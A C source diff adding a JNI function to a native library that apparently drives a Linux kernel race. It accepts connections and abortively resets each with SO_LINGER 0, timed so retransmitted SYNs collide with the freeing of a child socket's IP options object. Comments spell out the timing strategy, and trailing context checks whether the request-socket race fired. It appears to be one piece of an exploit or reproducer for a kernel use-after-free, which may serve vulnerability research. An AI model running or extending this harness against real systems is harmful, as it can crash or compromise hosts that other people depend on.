@@ -710,6 +710,44 @@ Java_com_inj_Native_acceptClose(JNIEnv *env, jclass cls, jint fd, jint count)
     }
     return done;
 }
+// SRTT decimator: accept one child and immediately RST it, with SO_LINGER 0.
+//
+// SO_LINGER with a zero timeout turns close() into an abortive release: the
+// kernel sends RST and runs inet_sock_destruct() synchronously inside the
+// close() syscall, on the cpu that runs this thread. The child - and therefore
+// the one ip_options_rcu object that the request socket handed over - is freed
+// the moment close() returns, no deferred work, no RCU, no softirq hop.
+//
+// The sequencing matters: ack1-style workloads free each options object once
+// and then the address goes quiet, which is exactly why that mode showed ~1
+// orphan per round while its object lived on. By re-opening with the same
+// address, port and ISN every round, the retransmitted SYN of round N keeps
+// colliding with the close of round N-1's child instead.
+JNIEXPORT jlong JNICALL
+Java_com_inj_Native_rstSrtt(JNIEnv *env, jclass cls, jint fd, jint rounds)
+{
+    long done = 0;
+    int i;
+    (void)env;
+    (void)cls;
+
+    for (i = 0; i < rounds; i++) {
+        struct linger lg;
+        int conn = accept(fd, NULL, NULL);
+        if (conn < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            break;
+        }
+        lg.l_onoff = 1;
+        lg.l_linger = 0;
+        setsockopt(conn, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
+        close(conn);
+        done++;
+    }
+    return done;
+}
 // Read IP_OPTIONS from a socket and report what came back.
 //
 // If the request-socket race fired, the winning child inherited an
